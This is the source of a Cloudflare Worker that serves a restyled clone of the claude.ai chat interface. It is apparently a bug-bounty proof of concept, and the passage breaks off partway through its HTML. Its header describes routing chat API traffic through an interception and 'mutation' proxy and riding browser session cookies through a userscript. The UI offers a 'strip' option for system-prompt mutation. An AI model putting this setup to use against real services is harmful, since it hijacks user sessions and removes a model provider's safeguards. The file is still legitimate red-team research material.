// ================================================================
// WORKER B — claude.ai/chat Functional Mimic (Cloudflare Worker)
// Sister PoC research artifact — Anthropic HackerOne VDP only
// Single-operator. Not for distribution.
//
// Visually distinct from claude.ai (Terminal Amber palette — dark charcoal,
// amber accent, blue counterpoint). Functionally 100% equivalent.
// <=80% visual similarity — no Anthropic logos, no AnthropicSans font.
//
// ENV VARS (Cloudflare Dashboard → Settings → Variables):
//   WORKER_C_URL  — Worker C intercept URL (primary)
//   WORKER_A_URL  — Worker A direct backend URL (fallback / closed-loop)
//   WS_URL        — WebSocket URL for Worker A bridge (default: ws://127.0.0.1:8787/ws)
//
// The SPA routes all /v1/messages and /api/organizations/* traffic through
// WORKER_C_URL (or WORKER_A_URL) so Worker C's mutation engine intercepts it.
// In cookie_bridge mode, the Tampermonkey userscript on claude.ai/chat
// handles the actual request via credentials:'include' so the browser
// auto-attaches session cookies.
//
// REFUSAL ITEMS (white-hat scope, HackerOne anthropic VDP):
//   1. Single operator only — no third-party user surface.
//   2. No Anthropic credential capture.
//   3. Visually distinct from claude.ai — Terminal Amber palette.
//   4. Blocked-host enforcement for CoCoDem C2 domains.
// ================================================================

export default {
  /**
   * Cloudflare Worker fetch handler for Worker B SPA.
   * Serves the embedded HTML on GET /, passes through everything else
   * to the configured WORKER_C_URL or WORKER_A_URL upstream.
   *
   * @param {Request}          request
   * @param {object}           env    — CF bindings (WORKER_C_URL, WORKER_A_URL, WS_URL)
   * @param {ExecutionContext}  ctx
   * @returns {Promise<Response>}
   */
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // Serve the SPA on any non-API path
    if (request.method === 'GET' && !url.pathname.startsWith('/api/') &&
        !url.pathname.startsWith('/v1/') && !url.pathname.startsWith('/edge-api/')) {
      const workerAUrl = env.WORKER_C_URL || env.WORKER_A_URL || 'http://127.0.0.1:8787';
      const wsUrl = env.WS_URL || (workerAUrl.replace(/^https?:/, 'ws:') + '/ws');
      const html = buildHTML(workerAUrl, wsUrl);
      return new Response(html, {
        headers: {
          'Content-Type': 'text/html; charset=utf-8',
          'Cache-Control': 'no-store'
        }
      });
    }

    // Pass through API calls to the configured upstream
    // (Worker B's SPA also sends fetch() requests that the CF Worker can proxy)
    const upstream = env.WORKER_C_URL || env.WORKER_A_URL || 'http://127.0.0.1:8787';
    const upstreamUrl = upstream.replace(/\/$/, '') + url.pathname + url.search;

    try {
      const init = {
        method: request.method,
        headers: request.headers,
      };
      if (request.method !== 'GET' && request.method !== 'HEAD') {
        init.body = await request.arrayBuffer();
      }
      const resp = await fetch(upstreamUrl, init);
      return new Response(resp.body, {
        status: resp.status,
        headers: resp.headers
      });
    } catch (err) {
      return new Response(JSON.stringify({
        error: { type: 'worker_b_proxy_error', message: err.message }
      }), { status: 502, headers: { 'content-type': 'application/json' } });
    }
  }
};

/**
 * Inject runtime configuration into the SPA HTML template.
 * Replaces placeholder strings with operator-configured values.
 *
 * @param {string} workerAUrl  — Worker A / Worker C URL
 * @param {string} wsUrl       — WebSocket URL for WS bridge
 * @returns {string}           — complete HTML document
 */
function buildHTML(workerAUrl, wsUrl) {
  return HTML_TEMPLATE
    .replace(/__INJECT_WORKER_A_URL__/g, workerAUrl)
    .replace(/__INJECT_WS_URL__/g, wsUrl);
}

// ================================================================
// EMBEDDED SPA HTML
// Worker B SPA — Terminal Amber design, functional claude.ai mimic
// Source: worker_b (2).html — wrapped as Cloudflare Worker ES module
// ================================================================
const HTML_TEMPLATE = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sister PoC — Worker B</title>
<style>
/* ================================================================
   WORKER B — "Terminal Amber" Design System
   Dark charcoal / amber / blue — NOT a claude.ai clone
   ================================================================ */
:root {
  --bg:         #0c0c10;
  --surface:    #13131a;
  --surface2:   #1a1a24;
  --surface3:   #21212e;
  --border:     #2c2c3e;
  --border2:    #383850;
  --text:       #d0d0e0;
  --text2:      #9090a8;
  --text3:      #5a5a70;
  --accent:     #e8903a;
  --accent-dim: rgba(232,144,58,.12);
  --accent-glow:rgba(232,144,58,.25);
  --blue:       #5d9de0;
  --blue-dim:   rgba(93,157,224,.10);
  --green:      #58b87a;
  --green-dim:  rgba(88,184,122,.10);
  --red:        #e05050;
  --red-dim:    rgba(224,80,80,.10);
  --purple:     #a878e8;
  --yellow:     #d4b040;
  --font-mono:  'Courier New', 'Menlo', 'Consolas', monospace;
  --font-sans:  'Segoe UI', system-ui, sans-serif;
  --radius:     3px;
  --sidebar-w:  260px;
  --artifact-w: 480px;
  --input-h:    140px;
  --topbar-h:   44px;
  --transition: 150ms ease;
}

*{box-sizing:border-box;margin:0;padding:0;}
::selection{background:var(--accent-dim);color:var(--accent);}
::-webkit-scrollbar{width:5px;height:5px;}
::-webkit-scrollbar-track{background:var(--surface);}
::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px;}
::-webkit-scrollbar-thumb:hover{background:var(--text3);}

html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:var(--font-sans);font-size:14px;line-height:1.5;}

/* ── TYPOGRAPHY ──────────────────────────────────────────────── */
.mono{font-family:var(--font-mono);}
.muted{color:var(--text2);}
.dim{color:var(--text3);}
.accent{color:var(--accent);}
.blue{color:var(--blue);}
.green{color:var(--green);}
.red{color:var(--red);}

/* ── BUTTONS ─────────────────────────────────────────────────── */
button{font-family:inherit;font-size:13px;cursor:pointer;border:none;outline:none;transition:var(--transition);}
.btn{display:inline-flex;align-items:center;gap:6px;padding:6px 14px;border-radius:var(--radius);font-weight:600;font-size:12px;letter-spacing:.04em;text-transform:uppercase;}
.btn-accent{background:var(--accent);color:#0c0c10;}
.btn-accent:hover{background:#f5a050;}
.btn-ghost{background:none;border:1px solid var(--border2);color:var(--text2);}
.btn-ghost:hover{border-color:var(--accent);color:var(--accent);}
.btn-danger{background:var(--red-dim);border:1px solid var(--red);color:var(--red);}
.btn-danger:hover{background:var(--red);color:#fff;}
.btn-icon{background:none;border:none;color:var(--text3);padding:4px;border-radius:var(--radius);display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;font-size:14px;}
.btn-icon:hover{background:var(--surface3);color:var(--text);}
.btn-sm{padding:4px 10px;font-size:11px;}

/* ── INPUTS ──────────────────────────────────────────────────── */
input,select,textarea{background:var(--surface2);border:1px solid var(--border);color:var(--text);padding:7px 10px;border-radius:var(--radius);font-family:inherit;font-size:13px;outline:none;transition:border-color var(--transition);}
input:focus,select:focus,textarea:focus{border-color:var(--accent);}
input::placeholder{color:var(--text3);}
textarea{resize:none;}
select option{background:var(--surface2);}
label{font-size:11px;color:var(--text2);text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:4px;}

/* ── AUTH SCREEN ─────────────────────────────────────────────── */
#auth-screen{
  position:fixed;inset:0;display:flex;align-items:center;justify-content:center;
  background:var(--bg);z-index:1000;
}
.auth-box{
  width:360px;background:var(--surface);border:1px solid var(--border);
  border-radius:6px;padding:40px 36px;
}
.auth-logo{
  font-family:var(--font-mono);font-size:11px;color:var(--accent);
  letter-spacing:.15em;text-transform:uppercase;margin-bottom:32px;
  display:flex;align-items:center;gap:8px;
}
.auth-logo::before{content:'▶';font-size:9px;}
.auth-title{font-size:20px;font-weight:700;margin-bottom:4px;}
.auth-sub{font-size:12px;color:var(--text2);margin-bottom:28px;}
.auth-field{margin-bottom:16px;}
.auth-field input{width:100%;}
.auth-error{color:var(--red);font-size:12px;margin-bottom:12px;padding:6px 8px;background:var(--red-dim);border-radius:var(--radius);display:none;}
.auth-switch{font-size:12px;color:var(--text2);margin-top:16px;text-align:center;}
.auth-switch a{color:var(--accent);cursor:pointer;text-decoration:none;}
.auth-switch a:hover{text-decoration:underline;}
.auth-server{font-size:11px;color:var(--text3);margin-top:20px;padding-top:16px;border-top:1px solid var(--border);font-family:var(--font-mono);}

/* ── APP LAYOUT ──────────────────────────────────────────────── */
#app{display:flex;height:100vh;overflow:hidden;}
#app.hidden{display:none;}

/* ── TOPBAR ──────────────────────────────────────────────────── */
.topbar{
  position:absolute;top:0;left:0;right:0;height:var(--topbar-h);
  background:var(--surface);border-bottom:1px solid var(--border);
  display:flex;align-items:center;padding:0 12px;gap:8px;z-index:50;
}
.topbar-brand{font-family:var(--font-mono);font-size:11px;color:var(--accent);letter-spacing:.12em;text-transform:uppercase;margin-right:8px;white-space:nowrap;}
.topbar-conv-name{font-size:13px;color:var(--text);font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.topbar-pills{display:flex;gap:6px;margin-left:auto;}
.pill{font-size:10px;font-family:var(--font-mono);padding:2px 7px;border-radius:2px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;}
.pill-ok{background:rgba(88,184,122,.15);color:var(--green);}
.pill-warn{background:rgba(232,144,58,.15);color:var(--accent);}
.pill-err{background:rgba(224,80,80,.15);color:var(--red);}
.pill-blue{background:rgba(93,157,224,.15);color:var(--blue);}

/* ── SIDEBAR ─────────────────────────────────────────────────── */
.sidebar{
  width:var(--sidebar-w);min-width:var(--sidebar-w);
  background:var(--surface);border-right:1px solid var(--border);
  display:flex;flex-direction:column;
  margin-top:var(--topbar-h);overflow:hidden;flex-shrink:0;
  transition:width var(--transition), min-width var(--transition);
}
.sidebar.collapsed{width:0;min-width:0;border-right-color:transparent;}

.sidebar-header{padding:10px 10px 8px;border-bottom:1px solid var(--border);}
.sidebar-search{position:relative;display:flex;align-items:center;}
.sidebar-search input{width:100%;padding-left:28px;font-size:12px;}
.sidebar-search::before{content:'⌕';position:absolute;left:8px;color:var(--text3);font-size:14px;pointer-events:none;}
.sidebar-actions{display:flex;gap:4px;margin-top:7px;}

.sidebar-section{flex:1;overflow-y:auto;}
.sidebar-label{font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:var(--text3);padding:8px 12px 4px;font-family:var(--font-mono);}

.conv-item{
  display:flex;align-items:flex-start;gap:8px;padding:8px 10px;
  cursor:pointer;border-left:2px solid transparent;transition:all var(--transition);
  position:relative;overflow:hidden;
}
.conv-item:hover{background:var(--surface2);border-left-color:var(--border2);}
.conv-item.active{background:var(--accent-dim);border-left-color:var(--accent);}
.conv-item .icon{font-size:13px;margin-top:1px;flex-shrink:0;opacity:.5;}
.conv-item.active .icon{opacity:1;}
.conv-info{flex:1;min-width:0;}
.conv-name{font-size:12px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--text);}
.conv-meta{font-size:10px;color:var(--text3);margin-top:1px;font-family:var(--font-mono);}
.conv-actions{display:none;gap:2px;flex-shrink:0;}
.conv-item:hover .conv-actions{display:flex;}

.sidebar-footer{padding:8px;border-top:1px solid var(--border);}
.user-row{display:flex;align-items:center;gap:8px;padding:6px 8px;border-radius:var(--radius);cursor:pointer;}
.user-row:hover{background:var(--surface2);}
.user-avatar{width:26px;height:26px;border-radius:2px;background:var(--accent-dim);border:1px solid var(--accent);display:flex;align-items:center;justify-content:center;font-size:11px;font-family:var(--font-mono);color:var(--accent);flex-shrink:0;}
.user-info{flex:1;min-width:0;}
.user-name{font-size:12px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.user-plan{font-size:10px;color:var(--accent);font-family:var(--font-mono);}

/* ── MAIN AREA ───────────────────────────────────────────────── */
.main{flex:1;display:flex;flex-direction:column;overflow:hidden;margin-top:var(--topbar-h);position:relative;}

/* ── MESSAGES ─────────────────────────────────────────────────── */
.messages{flex:1;overflow-y:auto;padding:20px 0;}

.msg{display:flex;gap:12px;padding:10px 20px;transition:background var(--transition);max-width:100%;}
.msg:hover{background:rgba(255,255,255,.02);}
.msg-avatar{width:30px;height:30px;border-radius:2px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:12px;font-family:var(--font-mono);font-weight:700;margin-top:1px;}
.msg-avatar.human{background:var(--blue-dim);border:1px solid var(--blue);color:var(--blue);}
.msg-avatar.assistant{background:var(--accent-dim);border:1px solid var(--accent);color:var(--accent);}
.msg-body{flex:1;min-width:0;}
.msg-header{display:flex;align-items:center;gap:8px;margin-bottom:5px;}
.msg-role{font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;font-family:var(--font-mono);}
.msg-role.human{color:var(--blue);}
.msg-role.assistant{color:var(--accent);}
.msg-time{font-size:10px;color:var(--text3);font-family:var(--font-mono);}
.msg-model{font-size:10px;color:var(--text3);padding:1px 5px;background:var(--surface3);border-radius:2px;font-family:var(--font-mono);}
.msg-content{font-size:13.5px;line-height:1.65;color:var(--text);}
.msg-content p{margin-bottom:10px;}
.msg-content p:last-child{margin-bottom:0;}
.msg-content pre{background:var(--surface3);border:1px solid var(--border);border-radius:var(--radius);padding:12px 14px;overflow-x:auto;margin:10px 0;font-family:var(--font-mono);font-size:12px;line-height:1.5;color:var(--text);}
.msg-content code{font-family:var(--font-mono);font-size:12px;background:var(--surface3);padding:1px 5px;border-radius:2px;color:var(--accent);}
.msg-content pre code{background:none;padding:0;color:var(--text);}
.msg-content h1,.msg-content h2,.msg-content h3{margin:14px 0 6px;font-weight:700;line-height:1.3;}
.msg-content h1{font-size:18px;color:var(--text);}
.msg-content h2{font-size:15px;color:var(--text);}
.msg-content h3{font-size:13.5px;color:var(--accent);}
.msg-content ul,.msg-content ol{margin:8px 0 8px 20px;}
.msg-content li{margin-bottom:4px;}
.msg-content blockquote{border-left:3px solid var(--accent);padding:8px 14px;background:var(--accent-dim);margin:10px 0;border-radius:0 var(--radius) var(--radius) 0;}
.msg-content table{border-collapse:collapse;width:100%;margin:10px 0;font-size:12.5px;}
.msg-content th{background:var(--surface3);padding:6px 10px;border:1px solid var(--border);text-align:left;font-weight:700;color:var(--accent);}
.msg-content td{padding:6px 10px;border:1px solid var(--border);}
.msg-content hr{border:none;border-top:1px solid var(--border);margin:14px 0;}
.msg-content a{color:var(--blue);text-decoration:none;}
.msg-content a:hover{text-decoration:underline;}

/* Thinking block */
.thinking-block{background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);margin:8px 0;overflow:hidden;}
.thinking-header{padding:6px 12px;font-size:11px;color:var(--text2);font-family:var(--font-mono);display:flex;align-items:center;gap:6px;cursor:pointer;user-select:none;}
.thinking-header::before{content:'▶';font-size:9px;transition:transform var(--transition);}
.thinking-block.expanded .thinking-header::before{transform:rotate(90deg);}
.thinking-content{display:none;padding:10px 14px;font-size:12px;line-height:1.6;color:var(--text2);font-style:italic;border-top:1px solid var(--border);}
.thinking-block.expanded .thinking-content{display:block;}

/* Tool use block */
.tool-block{background:var(--surface2);border:1px solid var(--purple);border-radius:var(--radius);margin:8px 0;overflow:hidden;}
.tool-header{padding:6px 12px;font-size:11px;color:var(--purple);font-family:var(--font-mono);display:flex;align-items:center;gap:6px;}
.tool-header::before{content:'⚙';font-size:12px;}
.tool-input{padding:10px 14px;font-size:11.5px;font-family:var(--font-mono);color:var(--text2);border-top:1px solid rgba(168,120,232,.2);}

/* Artifact button in message */
.artifact-ref{display:inline-flex;align-items:center;gap:6px;padding:6px 12px;background:var(--surface3);border:1px solid var(--border2);border-radius:var(--radius);font-size:12px;cursor:pointer;margin:6px 0;transition:all var(--transition);}
.artifact-ref:hover{border-color:var(--accent);color:var(--accent);}
.artifact-ref .art-icon{font-size:14px;}

/* Streaming cursor */
.cursor-blink{display:inline-block;width:7px;height:13px;background:var(--accent);vertical-align:text-bottom;animation:blink 1s step-end infinite;border-radius:1px;}
@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}

/* ── EMPTY STATE ─────────────────────────────────────────────── */
.empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;padding:40px;text-align:center;}
.empty-logo{font-family:var(--font-mono);font-size:13px;color:var(--accent);letter-spacing:.18em;text-transform:uppercase;opacity:.7;}
.empty-title{font-size:22px;font-weight:700;color:var(--text);}
.empty-sub{font-size:13px;color:var(--text2);max-width:380px;line-height:1.6;}
.quick-actions-grid{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;max-width:480px;}
.qa-btn{padding:8px 14px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;font-size:12px;color:var(--text2);display:flex;align-items:center;gap:6px;transition:all var(--transition);}
.qa-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim);}

/* ── INPUT AREA ──────────────────────────────────────────────── */
.input-area{
  border-top:1px solid var(--border);background:var(--surface);
  padding:12px 14px 10px;flex-shrink:0;
}
.input-toolbar{display:flex;align-items:center;gap:6px;margin-bottom:8px;}
.model-select-compact{background:none;border:1px solid var(--border);border-radius:var(--radius);color:var(--text2);padding:3px 6px;font-size:11px;font-family:var(--font-mono);cursor:pointer;}
.model-select-compact:hover{border-color:var(--accent);color:var(--accent);}
.input-mutation-badge{font-size:10px;font-family:var(--font-mono);padding:2px 6px;border-radius:2px;background:var(--surface3);color:var(--text3);border:1px solid var(--border);cursor:pointer;}
.input-mutation-badge:hover{border-color:var(--accent);color:var(--accent);}
.input-wrapper{position:relative;display:flex;align-items:flex-end;gap:8px;}
#msg-input{
  flex:1;resize:none;font-size:13.5px;line-height:1.6;
  min-height:52px;max-height:200px;overflow-y:auto;
  background:var(--surface2);border:1px solid var(--border2);
  padding:10px 12px;color:var(--text);border-radius:var(--radius);
  scrollbar-width:thin;
}
#msg-input:focus{border-color:var(--accent);}
#msg-input::placeholder{color:var(--text3);}
.send-btn{
  background:var(--accent);color:#0c0c10;border:none;border-radius:var(--radius);
  width:36px;height:36px;display:flex;align-items:center;justify-content:center;
  cursor:pointer;flex-shrink:0;font-size:15px;transition:background var(--transition);
  align-self:flex-end;
}
.send-btn:hover{background:#f5a050;}
.send-btn:disabled{background:var(--surface3);color:var(--text3);cursor:not-allowed;}
.stop-btn{background:var(--red-dim);border:1px solid var(--red);color:var(--red);border-radius:var(--radius);width:36px;height:36px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;align-self:flex-end;font-size:14px;transition:all var(--transition);}
.stop-btn:hover{background:var(--red);color:#fff;}
.input-footer{display:flex;align-items:center;justify-content:space-between;margin-top:6px;}
.input-hint{font-size:10px;color:var(--text3);font-family:var(--font-mono);}

/* ── ARTIFACT PANEL ──────────────────────────────────────────── */
.artifact-panel{
  width:var(--artifact-w);min-width:var(--artifact-w);
  background:var(--surface);border-left:1px solid var(--border);
  display:flex;flex-direction:column;margin-top:var(--topbar-h);
  transition:width var(--transition),min-width var(--transition);
  overflow:hidden;flex-shrink:0;
}
.artifact-panel.hidden{width:0;min-width:0;border-left-color:transparent;}

.artifact-header{padding:8px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;flex-shrink:0;}
.artifact-title{font-size:12px;font-weight:700;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--text);font-family:var(--font-mono);}
.artifact-lang{font-size:10px;padding:1px 5px;background:var(--surface3);border-radius:2px;color:var(--text2);font-family:var(--font-mono);}

.artifact-version-bar{display:flex;align-items:center;gap:6px;padding:5px 10px;border-bottom:1px solid var(--border);background:var(--surface2);flex-shrink:0;}
.version-btn{font-size:11px;background:var(--surface3);border:1px solid var(--border);color:var(--text2);padding:2px 8px;border-radius:2px;cursor:pointer;}
.version-btn:hover{border-color:var(--accent);color:var(--accent);}
.version-current{font-size:11px;color:var(--accent);font-family:var(--font-mono);flex:1;text-align:center;}
.version-count{font-size:10px;color:var(--text3);font-family:var(--font-mono);}

.artifact-tabs{display:flex;border-bottom:1px solid var(--border);flex-shrink:0;}
.artifact-tab{padding:6px 12px;font-size:11px;cursor:pointer;color:var(--text2);border-bottom:2px solid transparent;transition:all var(--transition);font-family:var(--font-mono);}
.artifact-tab:hover{color:var(--text);}
.artifact-tab.active{color:var(--accent);border-bottom-color:var(--accent);}

.artifact-content{flex:1;overflow:auto;position:relative;}
.artifact-code-view{padding:14px;font-family:var(--font-mono);font-size:12px;line-height:1.6;color:var(--text);white-space:pre-wrap;word-break:break-word;}
.artifact-preview{width:100%;height:100%;border:none;background:#fff;}
.artifact-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:12px;color:var(--text3);}
.artifact-empty-icon{font-size:32px;opacity:.3;}

/* ── SETTINGS PANEL ──────────────────────────────────────────── */
.settings-overlay{
  position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:200;
  display:flex;align-items:flex-end;justify-content:center;
  opacity:0;pointer-events:none;transition:opacity var(--transition);
}
.settings-overlay.open{opacity:1;pointer-events:all;}
.settings-panel{
  width:100%;max-width:580px;background:var(--surface);
  border-radius:8px 8px 0 0;border:1px solid var(--border);
  border-bottom:none;max-height:80vh;overflow-y:auto;
  transform:translateY(100%);transition:transform 250ms ease;
}
.settings-overlay.open .settings-panel{transform:translateY(0);}
.settings-panel-header{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--surface);}
.settings-panel-title{font-size:14px;font-weight:700;font-family:var(--font-mono);color:var(--accent);}
.settings-body{padding:18px;}
.settings-section{margin-bottom:22px;}
.settings-section-label{font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--accent);margin-bottom:10px;font-family:var(--font-mono);padding-bottom:4px;border-bottom:1px solid var(--accent-dim);}
.settings-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px;}
.settings-field{margin-bottom:10px;}
.settings-field input,.settings-field select,.settings-field textarea{width:100%;}

/* ── CONTEXT MENU ────────────────────────────────────────────── */
.ctx-menu{
  position:fixed;background:var(--surface2);border:1px solid var(--border2);
  border-radius:var(--radius);padding:4px;z-index:500;min-width:160px;
  box-shadow:0 8px 24px rgba(0,0,0,.5);display:none;
}
.ctx-menu.open{display:block;}
.ctx-item{display:flex;align-items:center;gap:8px;padding:6px 10px;cursor:pointer;border-radius:var(--radius);font-size:12px;color:var(--text);}
.ctx-item:hover{background:var(--surface3);}
.ctx-item.danger{color:var(--red);}
.ctx-item.danger:hover{background:var(--red-dim);}
.ctx-divider{height:1px;background:var(--border);margin:3px 0;}

/* ── NOTIFICATIONS ───────────────────────────────────────────── */
.toast-container{position:fixed;bottom:20px;right:20px;z-index:600;display:flex;flex-direction:column;gap:8px;}
.toast{
  padding:10px 14px;border-radius:var(--radius);font-size:12px;max-width:300px;
  display:flex;align-items:center;gap:8px;border:1px solid;
  animation:slide-in .2s ease;
  box-shadow:0 4px 12px rgba(0,0,0,.3);
}
.toast-ok{background:var(--green-dim);border-color:var(--green);color:var(--green);}
.toast-err{background:var(--red-dim);border-color:var(--red);color:var(--red);}
.toast-info{background:var(--blue-dim);border-color:var(--blue);color:var(--blue);}
.toast-warn{background:var(--accent-dim);border-color:var(--accent);color:var(--accent);}
@keyframes slide-in{from{transform:translateX(20px);opacity:0;}to{transform:translateX(0);opacity:1;}}

/* ── PANELS / MODALS ─────────────────────────────────────────── */
.modal-overlay{
  position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:300;
  display:flex;align-items:center;justify-content:center;
  opacity:0;pointer-events:none;transition:opacity var(--transition);
}
.modal-overlay.open{opacity:1;pointer-events:all;}
.modal{
  background:var(--surface);border:1px solid var(--border);border-radius:6px;
  width:90%;max-width:480px;max-height:80vh;overflow-y:auto;
  transform:scale(.96);transition:transform 200ms ease;
}
.modal-overlay.open .modal{transform:scale(1);}
.modal-header{padding:14px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
.modal-title{font-size:14px;font-weight:700;}
.modal-body{padding:18px;}
.modal-footer{padding:12px 18px;border-top:1px solid var(--border);display:flex;justify-content:flex-end;gap:8px;}

/* ── DIVIDER / LOADER ────────────────────────────────────────── */
.loader{display:inline-flex;gap:3px;align-items:center;}
.loader span{width:4px;height:4px;background:var(--accent);border-radius:50%;animation:loader-dot .8s ease infinite;}
.loader span:nth-child(2){animation-delay:.15s;}
.loader span:nth-child(3){animation-delay:.3s;}
@keyframes loader-dot{0%,80%,100%{transform:scale(.6);opacity:.4;}40%{transform:scale(1);opacity:1;}}

/* ── SEARCH MODAL ────────────────────────────────────────────── */
.search-modal-body input{font-size:15px;padding:10px 12px;}
.search-results{margin-top:12px;max-height:320px;overflow-y:auto;}
.search-result-item{padding:8px 10px;border-radius:var(--radius);cursor:pointer;border:1px solid transparent;margin-bottom:4px;}
.search-result-item:hover{background:var(--surface3);border-color:var(--border);}
.search-result-name{font-size:13px;font-weight:600;}
.search-result-snippet{font-size:11px;color:var(--text2);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}

/* ── SIDEBAR RESIZE HANDLE ───────────────────────────────────── */
.resize-handle{width:4px;background:transparent;cursor:col-resize;flex-shrink:0;transition:background var(--transition);}
.resize-handle:hover{background:var(--accent);}

/* ── TAG CHIPS ───────────────────────────────────────────────── */
.tag-chip{display:inline-flex;align-items:center;gap:4px;padding:1px 7px;border-radius:2px;font-size:10px;background:var(--surface3);color:var(--text2);border:1px solid var(--border);font-family:var(--font-mono);}

/* ── UTILITY ─────────────────────────────────────────────────── */
.flex{display:flex;}.flex-col{flex-direction:column;}.items-center{align-items:center;}.gap-2{gap:8px;}.gap-1{gap:4px;}.ml-auto{margin-left:auto;}.w-full{width:100%;}.hidden{display:none !important;}.sr-only{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);}
.scroll-y{overflow-y:auto;}
.truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
</style>
</head>
<body>

<!-- ── AUTH SCREEN ──────────────────────────────────────────────── -->
<div id="auth-screen">
  <div class="auth-box">
    <div class="auth-logo">Worker B — Sister PoC Chat</div>
    <h1 class="auth-title">Sign in</h1>
    <p class="auth-sub muted">Local operator authentication via Worker A</p>
    <div class="auth-error" id="auth-error">Invalid credentials</div>
    <div class="auth-field">
      <label>Email</label>
      <input type="email" id="auth-email" autocomplete="email" placeholder="operator@sister-poc.local" value="operator@sister-poc.local">
    </div>
    <div class="auth-field">
      <label>Password</label>
      <input type="password" id="auth-password" placeholder="Password" value="spoc_operator">
    </div>
    <button class="btn btn-accent w-full" id="auth-login-btn" style="width:100%;justify-content:center;padding:9px;">
      Sign in
    </button>
    <div class="auth-switch">
      Don't have an account? <a id="auth-toggle">Sign up</a>
    </div>
    <div class="auth-server">
      Worker A: <span id="worker-a-url">http://127.0.0.1:8787</span>
      <span id="worker-a-status" class="pill pill-warn" style="margin-left:6px">checking…</span>
    </div>
  </div>
</div>

<!-- ── MAIN APP ─────────────────────────────────────────────────── -->
<div id="app" class="hidden">
  <!-- Topbar -->
  <div class="topbar">
    <button class="btn-icon" id="toggle-sidebar" title="Toggle sidebar">☰</button>
    <span class="topbar-brand">⚡ SPoC</span>
    <span class="topbar-conv-name" id="conv-title">New Conversation</span>
    <div class="topbar-pills">
      <span id="wc-status-pill" class="pill pill-err">W-C ✗</span>
      <span id="backend-pill" class="pill pill-blue">—</span>
      <span id="model-pill" class="pill pill-warn" style="display:none"></span>
    </div>
    <button class="btn-icon" id="search-btn" title="Search conversations (Ctrl+K)">⌕</button>
    <button class="btn-icon" id="settings-btn" title="Settings">⚙</button>
    <button class="btn-icon" id="new-conv-btn" title="New conversation (Ctrl+Shift+O)">✚</button>
  </div>

  <!-- Layout -->
  <div style="display:flex;height:calc(100vh - 44px);overflow:hidden;">

    <!-- Sidebar -->
    <div class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-search">
          <input type="text" id="sidebar-search" placeholder="Search…">
        </div>
        <div class="sidebar-actions" style="margin-top:7px;">
          <button class="btn btn-ghost btn-sm" id="new-conv-btn2">✚ New</button>
          <button class="btn-icon" id="star-filter-btn" title="Starred only">★</button>
        </div>
      </div>
      <div class="sidebar-section" id="conv-list-container">
        <div class="sidebar-label">Recent</div>
        <div id="conv-list"></div>
      </div>
      <div class="sidebar-footer">
        <div class="user-row" id="user-row">
          <div class="user-avatar" id="user-avatar">OP</div>
          <div class="user-info">
            <div class="user-name" id="user-name">Operator</div>
            <div class="user-plan" id="user-plan">MAX 5X</div>
          </div>
          <button class="btn-icon" id="logout-btn" title="Sign out">⊗</button>
        </div>
      </div>
    </div>

    <!-- Resize handle -->
    <div class="resize-handle" id="resize-sidebar"></div>

    <!-- Main chat -->
    <div class="main" id="main-panel">
      <!-- Empty state / Messages -->
      <div id="messages-wrapper" style="flex:1;display:flex;flex-direction:column;overflow:hidden;">
        <div id="empty-state" class="empty-state">
          <div class="empty-logo">// Sister PoC Chat</div>
          <h2 class="empty-title">Start a conversation</h2>
          <p class="empty-sub">Connected to Worker A. Type a message below or select a quick action.</p>
          <div class="quick-actions-grid" id="qa-grid"></div>
        </div>
        <div id="messages" class="messages" style="display:none;"></div>
      </div>

      <!-- Input area -->
      <div class="input-area">
        <div class="input-toolbar">
          <select class="model-select-compact" id="model-select"></select>
          <button class="input-mutation-badge" id="mutation-badge" title="System prompt mutation">strip</button>
          <button class="btn-icon" id="attach-btn" title="Attach file">📎</button>
          <button class="btn-icon" id="thinking-btn" title="Extended thinking mode" style="color:var(--purple)">💭</button>
          <button class="btn-icon" id="tools-btn" title="Enable tools">🔧</button>
          <span class="ml-auto"></span>
          <button class="btn-icon" id="clear-btn" title="Clear conversation">✕ clear</button>
        </div>
        <div class="input-wrapper">
          <textarea id="msg-input" placeholder="Type a message… (Enter to send, Shift+Enter for newline)" rows="2"></textarea>
          <button class="send-btn" id="send-btn" title="Send (Enter)">▶</button>
          <button class="stop-btn hidden" id="stop-btn" title="Stop generation">⬛</button>
        </div>
        <div class="input-footer">
          <span class="input-hint" id="input-hint">Enter to send · Shift+Enter for newline · Ctrl+K to search</span>
          <span class="input-hint" id="token-hint"></span>
        </div>
      </div>
    </div>

    <!-- Resize handle -->
